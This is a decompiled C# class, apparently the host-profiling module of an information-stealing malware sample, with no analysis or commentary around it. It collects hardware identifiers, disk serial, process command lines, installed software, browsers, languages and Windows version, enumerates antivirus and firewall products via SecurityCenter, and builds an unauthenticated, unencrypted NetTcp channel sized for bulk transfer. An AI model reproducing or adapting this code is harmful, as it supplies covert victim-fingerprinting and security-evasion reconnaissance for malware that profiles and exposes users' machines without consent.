using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;

// Token: 0x02000043 RID: 67
public static class SystemInfoHelper
{
	// Token: 0x06000145 RID: 325 RVA: 0x0000ADE8 File Offset: 0x00008FE8
	public static System.ServiceModel.Channels.Binding CreateBind()
	{
		return new NetTcpBinding
		{
			MaxReceivedMessageSize = 2147483647L,
			MaxBufferPoolSize = 2147483647L,
			CloseTimeout = TimeSpan.FromMinutes(30.0),
			OpenTimeout = TimeSpan.FromMinutes(30.0),
			ReceiveTimeout = TimeSpan.FromMinutes(30.0),
			SendTimeout = TimeSpan.FromMinutes(30.0),
			TransferMode = TransferMode.Buffered,
			ReaderQuotas = new XmlDictionaryReaderQuotas
			{
				MaxDepth = 44567654,
				MaxArrayLength = int.MaxValue,
				MaxBytesPerRead = int.MaxValue,
				MaxNameTableCharCount = int.MaxValue,
				MaxStringContentLength = int.MaxValue
			},
			Security = new NetTcpSecurity
			{
				Mode = SecurityMode.None,
				Message = new MessageSecurityOverTcp
				{
					ClientCredentialType = MessageCredentialType.None
				}
			},
			ReliableSession = 
			{
				Enabled = true
			}
		};
	}

	// Token: 0x06000146 RID: 326 RVA: 0x0000AEDC File Offset: 0x000090DC
	public static List<SystemHardware> GetProcessors()
	{
		List<SystemHardware> list = new List<SystemHardware>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							list.Add(new SystemHardware
							{
								Name = (managementObject["Name"] as string),
								Counter = Convert.ToString(managementObject["NumberOfCores"]),
								HardType = HardwareType.Processor
							});
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000147 RID: 327 RVA: 0x0000AFD0 File Offset: 0x000091D0
	public static List<SystemHardware> GetGraphicCards()
	{
		List<SystemHardware> list = new List<SystemHardware>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							uint num = Convert.ToUInt32(managementObject["AdapterRAM"]);
							if (num > 0U)
							{
								list.Add(new SystemHardware
								{
									Name = (managementObject["Name"] as string),
									Counter = num.ToString(),
									HardType = HardwareType.Graphic
								});
							}
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x06000148 RID: 328 RVA: 0x0000B0D8 File Offset: 0x000092D8
	public static List<BrowserVersion> GetBrowsers()
	{
		List<BrowserVersion> list = new List<BrowserVersion>();
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet");
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet");
			}
			string[] subKeyNames = registryKey.GetSubKeyNames();
			for (int i = 0; i < subKeyNames.Length; i++)
			{
				BrowserVersion browserVersion = new BrowserVersion();
				RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
				browserVersion.NameOfBrowser = (string)registryKey2.GetValue(null);
				RegistryKey registryKey3 = registryKey2.OpenSubKey("shell\\open\\command");
				browserVersion.PathOfFile = registryKey3.GetValue(null).ToString().StripQuotes();
				if (browserVersion.PathOfFile != null)
				{
					browserVersion.Version = FileVersionInfo.GetVersionInfo(browserVersion.PathOfFile).FileVersion;
				}
				else
				{
					browserVersion.Version = "Unknown Version";
				}
				list.Add(browserVersion);
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000149 RID: 329 RVA: 0x0000B1C4 File Offset: 0x000093C4
	public static string GetSerialNumber()
	{
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							return managementObject["SerialNumber"] as string;
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x0600014A RID: 330 RVA: 0x0000B288 File Offset: 0x00009488
	public static List<string> ListOfProcesses()
	{
		List<string> list = new List<string>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Process Where SessionId='" + Process.GetCurrentProcess().SessionId + "'"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							List<string> list2 = list;
							string[] array = new string[6];
							array[0] = "ID: ";
							int num = 1;
							object obj = managementObject["ProcessId"];
							array[num] = ((obj != null) ? obj.ToString() : null);
							array[2] = ", Name: ";
							int num2 = 3;
							object obj2 = managementObject["Name"];
							array[num2] = ((obj2 != null) ? obj2.ToString() : null);
							array[4] = ", CommandLine: ";
							int num3 = 5;
							object obj3 = managementObject["CommandLine"];
							array[num3] = ((obj3 != null) ? obj3.ToString() : null);
							list2.Add(string.Concat(array));
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x0600014B RID: 331 RVA: 0x0000B434 File Offset: 0x00009634
	public static List<string> GetVs()
	{
		List<string> list = new List<string>();
		try
		{
			foreach (string str in "AntivirusProduct|AntiSpyWareProduct|FirewallProduct".Split(new char[]
			{
				'|'
			}))
			{
				try
				{
					using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("ROOT\\SecurityCenter", "SELECT * FROM " + str))
					{
						using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
						{
							foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
							{
								try
								{
									if (!list.Contains(managementBaseObject["displayName"] as string))
									{
										list.Add(managementBaseObject["displayName"] as string);
									}
								}
								catch
								{
								}
							}
						}
					}
				}
				catch
				{
				}
			}
			foreach (string str2 in "AntivirusProduct|AntiSpyWareProduct|FirewallProduct".Split(new char[]
			{
				'|'
			}))
			{
				try
				{
					using (ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher("ROOT\\SecurityCenter2", "SELECT * FROM " + str2))
					{
						using (ManagementObjectCollection managementObjectCollection2 = managementObjectSearcher2.Get())
						{
							foreach (ManagementBaseObject managementBaseObject2 in managementObjectCollection2)
							{
								try
								{
									if (!list.Contains(managementBaseObject2["displayName"] as string))
									{
										list.Add(managementBaseObject2["displayName"] as string);
									}
								}
								catch
								{
								}
							}
						}
					}
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	// Token: 0x0600014C RID: 332 RVA: 0x0000B734 File Offset: 0x00009934
	public static List<string> GetProcessesByName(string name, string ext)
	{
		List<string> list = new List<string>();
		try
		{
			name += ext;
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Process Where SessionId='" + Process.GetCurrentProcess().SessionId + "'"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							object obj = managementObject["Name"];
							if (((obj != null) ? obj.ToString() : null) == name)
							{
								List<string> list2 = list;
								object obj2 = managementObject["ExecutablePath"];
								list2.Add((obj2 != null) ? obj2.ToString() : null);
							}
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x0600014D RID: 333 RVA: 0x0000B850 File Offset: 0x00009A50
	public static List<string> ListOfPrograms()
	{
		List<string> list = new List<string>();
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
			using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name))
			{
				foreach (string name2 in registryKey.GetSubKeyNames())
				{
					try
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(name2))
						{
							string text = (string)((registryKey2 != null) ? registryKey2.GetValue("DisplayName") : null);
							string text2 = (string)((registryKey2 != null) ? registryKey2.GetValue("DisplayVersion") : null);
							if (!string.IsNullOrEmpty(text) && !string.IsNullOrWhiteSpace(text2))
							{
								text = text.Trim();
								text2 = text2.Trim();
								list.Add(Regex.Replace(text + " [" + text2 + "]", "[^\\u0020-\\u007F]", string.Empty));
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		return (from x in list
		orderby x
		select x).ToList<string>();
	}

	// Token: 0x0600014E RID: 334 RVA: 0x0000B9BC File Offset: 0x00009BBC
	public static List<string> AvailableLanguages()
	{
		List<string> result = new List<string>();
		try
		{
			return (from InputLanguage lang in InputLanguage.InstalledInputLanguages
			select lang.Culture.EnglishName).ToList<string>();
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x0600014F RID: 335 RVA: 0x0000BA1C File Offset: 0x00009C1C
	public static string TotalOfRAM()
	{
		string result = "0 Mb or 0";
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							double num = Convert.ToDouble(managementObject["TotalVisibleMemorySize"]);
							double num2 = num * 1024.0;
							double num3 = Math.Round(num / 1024.0, 2);
							result = string.Format("{0}{1}{2}", num3, " MB or ", num2).Replace(',', '.');
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x06000150 RID: 336 RVA: 0x0000BB38 File Offset: 0x00009D38
	public static string GetWindowsVersion()
	{
		try
		{
			string str;
			try
			{
				str = (Environment.Is64BitOperatingSystem ? "x64" : "x32");
			}
			catch (Exception)
			{
				str = "x86";
			}
			string text = SystemInfoHelper.<GetWindowsVersion>g__HKLM_GetString|11_0("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
			SystemInfoHelper.<GetWindowsVersion>g__HKLM_GetString|11_0("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion");
			if (!string.IsNullOrEmpty(text))
			{
				return text + " " + str;
			}
		}
		catch (Exception)
		{
		}
		return string.Empty;
	}

	// Token: 0x06000151 RID: 337 RVA: 0x0000BBC4 File Offset: 0x00009DC4
	[CompilerGenerated]
	internal static string <GetWindowsVersion>g__HKLM_GetString|11_0(string key, string value)
	{
		string result;
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(key);
			result = (((registryKey != null) ? registryKey.GetValue(value).ToString() : null) ?? string.Empty);
		}
		catch
		{
			result = string.Empty;
		}
		return result;
	}
}
